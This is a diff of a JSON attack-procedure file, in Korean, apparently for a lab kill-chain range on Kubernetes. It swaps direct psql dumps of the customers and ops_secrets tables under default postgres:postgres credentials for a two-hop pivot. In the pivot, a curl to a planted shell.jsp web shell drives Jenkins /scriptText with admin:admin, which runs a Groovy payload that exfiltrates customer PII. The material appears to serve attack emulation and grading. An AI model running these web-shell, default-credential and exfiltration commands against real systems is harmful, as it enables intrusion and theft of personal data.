@@ -1,26 +1,23 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 크라운(최종 목표). 탈취한 자격증명(postgres:postgres)으로 corp-crown PostgreSQL 11.2 에 접속해 customers(PII)·ops_secrets 를 SELECT 반출. killchain-4(ShopFlow)와 같은 T1213·같은 크라운 채점 언어(crown.asset in 크라운 상수) — corp 자산은 ops_secrets·customers_pii(common/app_signals). 대안 CVE-2019-9193(COPY FROM PROGRAM)은 postgres.json 절차 재사용. 조건 문법은 postgres.json(canonical).",
+  "_note": "핵심층 환경 — corp 킬체인 크라운(최종 목표). ext/dmz 발판에서 shell.jsp → Jenkins /scriptText → crown-read.groovy evaluate 2-hop pivot 으로 corp-crown PostgreSQL 에 접속해 customers 를 SELECT 반출. killchain-4(ShopFlow)와 같은 T1213·같은 크라운 채점 언어(crown.asset in 크라운 상수) — corp 자산은 customers_pii(common/app_signals). 조건 문법은 postgres.json(canonical).",
   "env": "corp-crown-read",
   "technique": "T1213",
   "cwe": "CWE-522",
   "procedure": {
     "id": "PROC-corp-crown-read",
-    "name": "corp PostgreSQL 민감 테이블 read",
-    "description": "★에서 탈취한 자격증명(postgres:postgres)으로 postgres.corp-crown.svc.cluster.local:5432 에 psql 로 접속해 customers·ops_secrets 테이블을 SELECT 한다. 접속은 서비스 DNS 이름으로, 약한 슈퍼유저 인증(postgres/postgres)을 그대로 쓴다 — 비밀번호 추측 스텝 불필요. 채점은 플래그 없이 DB 접근로그의 해당 테이블 read 흔적(crown_of_sql)으로 선다. k8s Secret·SA 토큰 열거는 자격증명 수집일 뿐 크라운이 아니다.",
+    "name": "corp PostgreSQL 민감 테이블 read (Jenkins 경유)",
+    "description": "shell.jsp(dmz) 발판에서 curl 로 Jenkins(internal) /scriptText 를 호출하여 Groovy evaluate 로 /opt/payload/crown-read.groovy 를 실행 → Jenkins Pod 내 postgres JDBC(/var/jenkins_home/.groovy/lib/postgresql.jar) 를 URLClassLoader 로 로드 → postgres.corp-crown(crown) 에 접속해 customers 를 SELECT 반출. 채점은 플래그 없이 DB 접근로그의 해당 테이블 read 흔적(crown)으로 선다. k8s Secret·SA 토큰 열거는 자격증명 수집(T1552.001, corp-jenkins-cred)일 뿐 크라운이 아니다.",
     "status": "AUTHORED",
     "steps": [
       {"id": "STEP-corp-crown-pii", "seq": 1,
-       "command": "psql 'postgresql://postgres:postgres@postgres.corp-crown.svc.cluster.local:5432/postgres' -c 'SELECT * FROM customers LIMIT 5;'",
-       "description": "고객 PII 조회(customers_pii)"},
-      {"id": "STEP-corp-crown-ops", "seq": 2,
-       "command": "psql 'postgresql://postgres:postgres@postgres.corp-crown.svc.cluster.local:5432/postgres' -c 'SELECT * FROM ops_secrets;'",
-       "description": "운영 비밀 반출(ops_secrets, 크라운)"}
+       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20--data-urlencode%20%27script%3Devaluate%28new%20File%28%22%2Fopt%2Fpayload%2Fcrown-read.groovy%22%29.text%29%27%20http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText'",
+       "description": "★ 유일 경로 — shell.jsp(dmz) → Jenkins /scriptText(internal) → evaluate(/opt/payload/crown-read.groovy) → corp-crown/postgres JDBC → customers 반출. ★ 실패 경로(쓰지 말 것): shell.jsp 안에서 직접 psql — Tomcat 컨테이너에 psql 미설치 + ext/dmz→crown TCP 는 NetworkPolicy 로 차단 (연결 타임아웃). ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 자격증명). ★ 응답 형식: `CROWN_COLS:<컬럼명 콤마>` 한 줄 + `CROWN_ROW:<값|값|...>` 10줄. 이 응답이 T1213 크라운 반출의 산출물."}
     ]
   },
   "preconditions": [
-    {"id": "PRE-corp-crown-creds-network",
-     "name": "크라운 자격증명 + 네트워크 경로",
-     "description": "★에서 corp-db.properties 자격증명을 얻고 내부(zone:internal)에서 corp-crown 으로의 네트워크 접근(존 격리상 internal→crown 만 개방)을 확보해 PostgreSQL 접속 가능."}
+    {"id": "PRE-corp-crown-pivot",
+     "name": "shell.jsp 발판 + Jenkins 기본 자격증명 + 사전배치 payload",
+     "description": "Tomcat shell.jsp(dmz) RCE 획득(STEP-corp-tomcat-exec 등) + Jenkins VulHub 기본 자격증명 admin:admin + Jenkins Pod 에 /opt/payload/crown-read.groovy 사전배치(ConfigMap jenkins-ops-payload). shell.jsp → Jenkins(internal) 는 allow-from-dmz 로 개방, Jenkins(internal) → postgres(crown) 는 allow-from-internal 로 개방 — 2-hop pivot 유일."}
   ],
   "expected_results": [
     {"id": "ER-corp-crown-read",
